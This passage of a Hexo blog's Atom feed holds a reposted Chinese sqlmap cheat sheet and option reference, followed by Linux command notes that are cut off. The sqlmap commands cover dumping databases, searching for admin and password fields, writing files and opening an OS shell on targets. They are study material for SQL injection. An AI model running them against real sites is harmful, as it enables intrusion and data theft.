<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-03-04T10:38:46.835Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2025-03-04T12:50:02.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载自<a class="link"   href="https://www.cnblogs.com/R3col/p/12452543.html" >https://www.cnblogs.com/R3col/p/12452543.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap支持五种不同的注入模式：<br>基于布尔的盲注<br>基于时间的盲注<br>基于报错注入<br>联合查询注入<br>堆叠注入<br>sqlmap支持九种不同的数据库：<br>​ MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><p>自动检测</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -batch</span><br></pre></td></tr></table></figure></div><p>指定参数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx/?id=x&amp;param=x -p id</span><br></pre></td></tr></table></figure></div><p>指定数据库类型</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx –dbms mysql</span><br></pre></td></tr></table></figure></div><p>从文件读取http请求报文</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch</span><br></pre></td></tr></table></figure></div><p>设置cookie</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --cookie=&quot;JSESSION=asd&quot;</span><br></pre></td></tr></table></figure></div><p>查询数据库</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --dbs</span><br></pre></td></tr></table></figure></div><p>查询表</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 --tables</span><br></pre></td></tr></table></figure></div><p>查字段名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure></div><p>爆数据</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 -C &quot;字段名1，字段名2&quot;--dump</span><br></pre></td></tr></table></figure></div><p>在数据库中搜索字段 &#x2F; 表 &#x2F; 数据库名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password</span><br></pre></td></tr></table></figure></div><p>写入文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx -–file-dest &quot;要写入的文件在本地的路径&quot; –file-write &quot;目标路径&quot;</span><br></pre></td></tr></table></figure></div><p>调用shell</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx --os-shell</span><br></pre></td></tr></table></figure></div><p>-tip: 是否跟随302跳转<br>​ 当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br>​ 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br>​ 目的是要追踪到错误信息。</p><h2 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h2><p>用法<br>python sqlmap.py [选项]</p><p>选项</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help            显示基本帮助信息并退出</span><br><span class="line">-hh                   显示高级帮助信息并退出</span><br><span class="line">--version             显示程序版本信息并退出</span><br><span class="line">-v VERBOSE            输出信息详细程度级别：0-6（默认为 1）</span><br></pre></td></tr></table></figure></div><p>目标<br>​ 至少提供一个以下选项以指定目标</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d DIRECT           直接连接数据库</span><br><span class="line">-u URL, --url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）</span><br><span class="line">-l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">-m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">-r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">-g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">-c CONFIGFILE       从 INI 配置文件中加载选项</span><br></pre></td></tr></table></figure></div><p>请求<br>​ 以下选项可以指定连接目标地址的方式</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）</span><br><span class="line">--param-del=PARA..  设置参数值分隔符（例如：&amp;）</span><br><span class="line">--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）</span><br><span class="line">--cookie-del=COO..  设置 cookie 分隔符（例如：;）</span><br><span class="line">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">--user-agent=AGENT  指定 HTTP User-Agent</span><br><span class="line">--random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">--host=HOST         指定 HTTP Host</span><br><span class="line">--referer=REFERER   指定 HTTP Referer</span><br><span class="line">-H HEADER, --hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br><span class="line">--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br><span class="line">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）</span><br><span class="line">--ignore-proxy      忽略系统默认代理设置</span><br><span class="line">--ignore-redirects  忽略重定向尝试</span><br><span class="line">--ignore-timeouts   忽略连接超时</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">--proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">--tor               使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">--check-tor         检查是否正确使用了 Tor</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">--randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                    有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                    后面的“请求”小节有详细说明）</span><br><span class="line">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">--safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br><span class="line">--force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">--hpp               使用 HTTP 参数污染攻击</span><br><span class="line">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure></div><p>优化<br>​ 以下选项用于优化 sqlmap 性能</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o                  开启所有优化开关</span><br><span class="line">--predict-output    预测常用请求的输出</span><br><span class="line">--keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br></pre></td></tr></table></figure></div><p>注入<br>​ 以下选项用于指定要测试的参数，<br>​ 提供自定义注入 payloads 和篡改参数的脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">--skip=SKIP         指定要跳过的参数</span><br><span class="line">--skip-static       指定跳过非动态参数</span><br><span class="line">--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）</span><br><span class="line">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br><span class="line">                    数据库管理系统）类型（例如：MySQL）</span><br><span class="line">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">--os=OS             指定后端 DBMS 的操作系统类型</span><br><span class="line">--invalid-bignum    将无效值设置为大数</span><br><span class="line">--invalid-logical   对无效值使用逻辑运算</span><br><span class="line">--invalid-string    对无效值使用随机字符串</span><br><span class="line">--no-cast           关闭 payload 构造机制</span><br><span class="line">--no-escape         关闭字符串转义机制</span><br><span class="line">--prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">--tamper=TAMPER     用给定脚本修改注入数据</span><br></pre></td></tr></table></figure></div><p>检测<br>​ 以下选项用于自定义检测方式</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=LEVEL       设置测试等级（1-5，默认为 1）</span><br><span class="line">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br><span class="line">--string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line">--not-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line">--text-only         只根据页面文本内容对比页面</span><br><span class="line">--titles            只根据页面标题对比页面</span><br></pre></td></tr></table></figure></div><p>技术<br>​ 以下选项用于调整特定 SQL 注入技术的测试方法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                    B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                    E: Error-based SQL injection（报错型注入）</span><br><span class="line">                    U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                    S: Stacked queries SQL injection（堆叠查询注入）</span><br><span class="line">                    T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                    Q: inline Query injection（内联查询注入）</span><br><span class="line">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line">--union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                    推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                    http://cb.drops.wiki/drops/tips-5283.html，</span><br><span class="line">                    在后面的“技术”小节中也有相应解释）</span><br><span class="line">--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                    该选项用于 SQL 二阶注入）</span><br><span class="line">--second-req=SEC..  从文件读取 HTTP 二阶请求</span><br></pre></td></tr></table></figure></div><p>指纹识别</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br></pre></td></tr></table></figure></div><p>枚举<br>​ 以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。<br>​ 此外，还可以运行你输入的 SQL 语句</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all           获取所有信息、数据</span><br><span class="line">-b, --banner        获取 DBMS banner</span><br><span class="line">--current-user      获取 DBMS 当前用户</span><br><span class="line">--current-db        获取 DBMS 当前数据库</span><br><span class="line">--hostname          获取 DBMS 服务器的主机名</span><br><span class="line">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">--users             枚举出 DBMS 所有用户</span><br><span class="line">--passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">--privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">--roles             枚举出 DBMS 所有用户角色</span><br><span class="line">--dbs               枚举出 DBMS 所有数据库</span><br><span class="line">--tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">--columns           枚举出 DBMS 表中的所有列</span><br><span class="line">--schema            枚举出 DBMS 所有模式</span><br><span class="line">--count             获取数据表数目</span><br><span class="line">--dump              导出 DBMS 数据库表项</span><br><span class="line">--dump-all          导出所有 DBMS 数据库表项</span><br><span class="line">--search            搜索列，表和/或数据库名</span><br><span class="line">--comments          枚举数据时检查 DBMS 注释</span><br><span class="line">-D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">-T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">-C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">-X EXCLUDE          指定不枚举的 DBMS 标识符</span><br><span class="line">-U USER             指定枚举的 DBMS 用户</span><br><span class="line">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">--pivot-column=P..  指定主列</span><br><span class="line">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">--start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">--stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br><span class="line">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">--sql-query=QUERY   指定要执行的 SQL 语句</span><br><span class="line">--sql-shell         调出交互式 SQL shell</span><br><span class="line">--sql-file=SQLFILE  执行文件中的 SQL 语句</span><br></pre></td></tr></table></figure></div><p>暴力破解<br>​ 以下选项用于暴力破解测试</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--common-tables     检测常见的表名是否存在</span><br><span class="line">--common-columns    检测常用的列名是否存在</span><br></pre></td></tr></table></figure></div><p>用户自定义函数注入<br>​ 以下选项用于创建用户自定义函数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--udf-inject        注入用户自定义函数</span><br><span class="line">--shared-lib=SHLIB  共享库的本地路径</span><br></pre></td></tr></table></figure></div><p>访问文件系统<br>​ 以下选项用于访问后端 DBMS 的底层文件系统</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br><span class="line">--file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br><span class="line">--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br></pre></td></tr></table></figure></div><p>访问操作系统<br>​ 以下选项用于访问后端 DBMS 的底层操作系统</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">--os-shell          调出交互式操作系统 shell</span><br><span class="line">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">--priv-esc          数据库进程用户提权</span><br><span class="line">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure></div><p>访问 Windows 注册表：<br>​ 以下选项用于访问后端 DBMS 的 Windows 注册表</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--reg-read          读取一个 Windows 注册表键值</span><br><span class="line">--reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">--reg-del           删除一个 Windows 注册表键值</span><br><span class="line">--reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">--reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">--reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br></pre></td></tr></table></figure></div><p>通用选项：<br>​ 以下选项用于设置通用的参数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">-t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">--batch             从不询问用户输入，使用默认配置</span><br><span class="line">--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）</span><br><span class="line">--check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）</span><br><span class="line">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）</span><br><span class="line">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">--eta               显示每个结果输出的预计到达时间</span><br><span class="line">--flush-session     清空当前目标的会话文件</span><br><span class="line">--forms             解析并测试目标 URL 的表单</span><br><span class="line">--fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">--hex               获取数据时使用 hex 转换</span><br><span class="line">--output-dir=OUT..  自定义输出目录路径</span><br><span class="line">--parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">--preprocess=PRE..  使用给定脚本预处理响应数据</span><br><span class="line">--repair            重新导出具有未知字符的数据（?）</span><br><span class="line">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">--scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">--update            更新 sqlmap</span><br></pre></td></tr></table></figure></div><p>杂项</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">--answers=ANSWERS   设置预定义回答（例如：“quit=N,follow=N”）</span><br><span class="line">--beep              出现问题提醒或在发现 SQL 注入时发出提示音</span><br><span class="line">--cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span><br><span class="line">--dependencies      检查 sqlmap 缺少（可选）的依赖</span><br><span class="line">--disable-coloring  关闭彩色控制台输出</span><br><span class="line">--gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf      针对 WAF/IPS 防护进行彻底的测试</span><br><span class="line">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">--offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">--purge             安全删除 sqlmap data 目录所有内容</span><br><span class="line">--skip-waf          跳过启发式检测 WAF/IPS 防护</span><br><span class="line">--smart             只有在使用启发式检测时才进行彻底的测试</span><br><span class="line">--sqlmap-shell      调出交互式 sqlmap shell</span><br><span class="line">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）</span><br><span class="line">--wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linux命令</title>
    <link href="http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/</id>
    <published>2025-02-16T22:49:37.000Z</published>
    <updated>2025-03-04T10:38:46.834Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>cd : 切换目录<br>cd :切换路径<br>cd ~ 切换到当前用户的家目录<br>cd . 切换到当前路径<br>cd .. 切换到上一级路径<br>cd ..&#x2F;.. 切换到上上级路径(其中：在linux中路径分隔符为斜杠&#x2F;)<br>cd - 切换到上一次的路径</p><hr><p>ls : 列出目录内容<br>ls:列出目录内容<br>ls -l:列出详细信息<br>ls -a:列出全部文件信息，包括隐藏文件<br>ls -d:列出目录详细信息<br>ls -h:列出文件信息并显示文件大小单位</p><hr><p>alias&#x2F;unalias  : 命令别名&#x2F;取消命令别名<br>alias 别名&#x3D;’命令’ :给命令起别名<br>unalias 别名 :取消命令别名<br>unalias -a 别名 :取消所有别名 </p><hr><p>mv : 移动、重命名文件<br>mv 旧文件名 新文件名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改文件名<br>如：mv file1 filea将当前目录的文件file1改名为filea<br>mv 旧目录名 新目录名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改目录名<br>如：mv dir1 dira将当前目录下的目录dir1改为dira<br>​mv 文件名  目录名  &#x3D;&#x3D;&#x3D;&#x3D;&gt;移动路径<br>如：mv filea dira将当前目录下filea移动到dira子目录<br>如：mv filea ~ 将当前目录下filea移动家目录<br>如：mv ~&#x2F;filea ..将家目录下的fila移动到上一个路径</p><hr><p>cp ：复制文件(目录)<br>&#x3D;&#x3D;复制 cp -r 目录 -v 详细 -f 强制 -n 静默<br>​<br>1） cp 源文件名 目标文件名<br>举例：<br> cp File1 file2将当前目录下的文件File1拷贝成file2</p><p>2） cp 源文件名 目标目录名<br>举例：<br>cp file2 dira&#x2F;将当前目录下的文件file2拷贝到dira子目录<br>​<br>3） cp 源目录名 目标目录名<br>举例：<br>cp -r dira dirb复制dira目录下的所有内容到dirb。其中,-r参数是递归复制<br>cp -i file2 dira如果dira目录下面有同名的file2，加入-i参数就会要求你确认是否覆盖同名的文件</p><hr><p>mkdir : 创建空目录<br>mkdir dir1<br>创建两个目录：<br>mkdir &#x2F;home&#x2F;dir2 &#x2F;home&#x2F;dir3<br>mkdir &#x2F;home&#x2F;{dir4,dir5}<br>mkdir -v &#x2F;home&#x2F;{dir6,dir7} #-v ：verbose 冗长的。显示创建时的详细信息<br>mkdir -p &#x2F;home&#x2F;dir8&#x2F;111&#x2F;222 #-p 创建连级目录，一级一级的创建<br>rmdir : 删除空目录<br>&#x3D;&#x3D;删除 rm -r 递归删除目录 -f force强制 -v 详细过程  *通配符</p><p>​—</p><p>rm:删除目录及内容<br>rm -rf :删除所有<br>touch : 创建空文件<br>[root@linux-server ~]# touch file1.txt &#x2F;&#x2F;无则创建，如果存在修改时间<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file10.txt<br>[root@linux-server ~]# touch &#x2F;home&#x2F;{zhuzhu,gougou} &#x2F;&#x2F;{}集合<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file{1..20} &#x2F;&#x2F;批量创建</p><hr><p>echo : 写入<br>echo 加内容 &gt; 加文件名 #覆盖:把之前的内容替换掉<br>​echo 123 &gt; a.txt<br>echo 加内容 &gt;&gt; 加文件名  #追加:保留之前的内容,在后面添加新内容<br>​echo 345345 &gt;&gt; a.txt<br>​当使用echo 123 &gt;&gt; a.txt 这个命令的时候在文件不存在的时候会创建该文件并将内容追加到改文件中</p><hr><p>stat : 详细查看文件访问时间等信息<br>root@localhost ~] #stat file文件: “file”<br>大小 : 24     块 ：8    IO块 : 4096  普通文件<br>设备 : fdooh&#x2F;64768d   Inode : 35493573  硬链接∶1<br>权限 : ( 0644&#x2F;- rw- r–r– )  Uid : ( 0&#x2F; root)  Gid : (  0&#x2F;  root）<br>环境 : unconfined_u: object_r: admin_home_t: so<br>最近访问:2023-04-05 11:31:37.678858345 +080O<br>最近更改:2023-04-05 11:31:35.590867350 +080O<br>最近改动:2023-04-05 11:31:53.385790608 +080O<br>创建时间: -</p><hr><p>awk：以关键字分隔查看内容<br>awk -F “:” ‘{print $2}’ 文件路径<br>例如:<br>[root@localhost ~]# cat &#x2F;home&#x2F;a<br>aaaa:skas:asdd<br>[root@localhost ~]# awk -F “:” ‘{print $2}’ &#x2F;home&#x2F;a<br>skas</p><hr><p>sort: 排序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行<br>参数详解：<br>sort 排序，默认升序<br>-t 指定分隔符<br>-k 指定列<br>-n 按数值<br>-r 降序</p><hr><p>wc :统计数据<br>wc -l :统计有多少行数据</p><hr><p>find : 针对文件属性查找文件<br>-name : 按文件名查找<br>[root@localhost ~]# find &#x2F;var&#x2F;cache&#x2F;yum&#x2F; -name “<em>.rpm” #查找&#x2F;var&#x2F;cache&#x2F;yum下以.rpm结尾的文件<br>[root@localhost ~]# find &#x2F;etc -iname “Ifcfg-ens33”     #-i忽略大小写<br>-size : 按文件大小查找<br>[root@localhost ~]# find &#x2F;etc -size +5M  #查找大于5M<br>[root@localhost ~]# find &#x2F;etc -size 5M  #等于5M<br>[root@localhost ~]# find &#x2F;etc -size -5M  #小于5M<br>​<br>[root@localhost ~]# find &#x2F; -size +3M -a -size -5M   #查找&#x2F;下面大于3M而且小于5M的文件 —a:and<br>[root@localhost ~]# find &#x2F; -size -1M -o -size +8M   #查找&#x2F;下面小于1M或者大于8M的文件 -o:or<br>[root@localhost ~]# find &#x2F; -size -3M -a -name “</em>.txt” #查找&#x2F;下面小于3M而且名字是以.txt结尾的文件<br>-atime&#x2F;mtime&#x2F;ctime : 按时间查找<br>-atime &#x3D; access访问时间            #单位是 天<br>-mtime &#x3D; modify改变时间 内容修改时间会改变<br>-ctime &#x3D; change修改时间 属性修改时间会改变<br>​<br>-amin 